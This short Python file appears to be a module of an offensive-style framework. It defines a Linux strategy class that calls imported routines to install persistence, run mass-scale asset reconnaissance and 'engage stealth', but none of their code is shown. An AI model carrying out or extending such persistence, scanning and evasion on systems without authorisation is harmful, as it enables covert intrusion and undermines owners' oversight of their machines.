from apex_framework.ops.privacy import PrivacyManager
from apex_framework.ops.daemon import ServiceDaemon
from apex_framework.ops.discovery import AssetDiscovery
from rich.console import Console

console = Console()

class LinuxStrategy:
    """
    Operations for Linux Environments (Default).
    """
    def install_persistence(self):
        daemon = ServiceDaemon()
        daemon.persist()

    def perform_recon(self):
        recon = AssetDiscovery(".")
        recon.scan_mass_scale()

    def engage_stealth(self):
        privacy_manager = PrivacyManager()
        privacy_manager.deploy()
